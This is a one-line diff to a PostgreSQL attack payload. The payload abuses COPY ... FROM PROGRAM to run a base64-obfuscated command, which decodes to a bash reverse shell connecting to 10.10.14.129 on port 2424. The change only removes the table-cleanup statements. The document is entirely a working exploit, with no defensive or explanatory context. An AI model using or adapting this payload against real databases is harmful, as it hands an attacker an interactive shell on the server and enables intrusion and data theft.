@@ -1,1 +1,1 @@
-DROP TABLE IF EXISTS payload; CREATE TABLE payload(cmd_output text); COPY payload FROM PROGRAM 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyOS8yNDI0IDA+JjEK | base64 -d | bash'; SELECT * FROM payload; DROP TABLE IF EXISTS payload;
+CREATE TABLE payload(cmd_output text); COPY payload FROM PROGRAM 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyOS8yNDI0IDA+JjEK | base64 -d | bash'; SELECT * FROM payload;
